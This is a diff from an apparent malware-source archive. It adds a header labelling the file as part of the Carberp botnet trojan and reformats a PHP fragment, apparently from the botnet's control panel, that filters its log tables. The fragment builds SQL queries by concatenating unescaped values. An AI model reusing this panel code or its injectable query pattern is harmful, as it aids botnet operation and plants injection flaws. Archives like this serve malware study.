@@ -1,6 +1,19 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       —
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     —
+ */
 <?php
 
-if(!empty($Cur['str']) && !empty($Cur['id'])){	$b = explode('0', $Cur['str'], 2);	//$logs = $mysqli->query('SELECT type,  FROM bf_logs_' . $Cur['id'] . ' WHERE (prefix=\''.$b[0].'\') AND (uid=\'0'.$b[1].'\')', null, null, false);
+if(!empty($Cur['str']) && !empty($Cur['id'])){
+	$b = explode('0', $Cur['str'], 2);
+	//$logs = $mysqli->query('SELECT type,  FROM bf_logs_' . $Cur['id'] . ' WHERE (prefix=\''.$b[0].'\') AND (uid=\'0'.$b[1].'\')', null, null, false);
     $filter = ' WHERE ((prefix=\''.$b[0].'\') AND (uid=\'0'.$b[1].'\'))';
 	foreach($_SESSION['search']['logs'] as $key => $value){
 		if(!empty($value)){
